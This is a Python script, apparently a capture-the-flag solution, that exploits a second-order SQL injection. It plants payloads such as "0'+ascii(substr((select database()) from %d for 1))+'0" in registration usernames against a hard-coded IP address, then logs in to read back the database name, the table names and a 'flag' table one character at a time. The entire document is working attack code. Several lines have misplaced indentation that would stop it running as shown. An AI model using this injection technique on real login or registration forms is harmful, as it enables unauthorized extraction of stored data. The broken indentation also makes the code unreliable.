import requests
import re

register_url = "http://111.198.29.45:34311/register.php"
login_url = "http://111.198.29.45:34311/login.php"
database = ""
table_name = ""
column_name = ""
flag = ""
# 获取数据库名
for i in range(1, 10):
    register_data = {
    'email': 'a@1.com' + str(i),
        'username': "0'+ascii(substr((select database()) from %d for 1))+'0" % i,
        'password': 1
    }
    r = requests.post(url=register_url, data=register_data)
    login_data = {
    'email': 'a@1.com' + str(i),
        'password': 1
    }
    r = requests.post(url=login_url, data=login_data)
    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', r.text)
    asc = match.group(1)
     if asc == '0':
         break
    database = database + chr(int(asc))
print('database:', database)
# 获取表名
for i in range(1, 20):
    register_data = {
    'email': 'a@1.com' + str(i),
        'username': "0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0" % i,
        'password': 1
        }
    r = requests.post(url=register_url, data=register_data)
     print(r.text)
    login_data = {
    'email': 'a@1.com' + str(i),
        'password': 1
        }
    r = requests.post(url=login_url, data=login_data)
    r.encoding = r.apparent_encoding
     print(r.text)
    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', r.text)
    asc = match.group(1)
     if asc == '0':
         break
    table_name = table_name + chr(int(asc))
print('table_name:', table_name)
# 获取flag
for i in range(1, 100):
    register_data = {
    'email': 'a@1.com' + str(i) + str(i),
        'username': "0'+ascii(substr((select * from flag) from %d for 1))+'0" % i,
        'password': 1
    }
    r = requests.post(url=register_url, data=register_data)
    login_data = {
    'email': 'a@1.com' + str(i) + str(i),
        'password': 1
    }
    r = requests.post(url=login_url, data=login_data)
    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', r.text)
    asc = match.group(1)
     if asc == '0':
         break
    flag = flag + chr(int(asc))
print('flag:', flag)
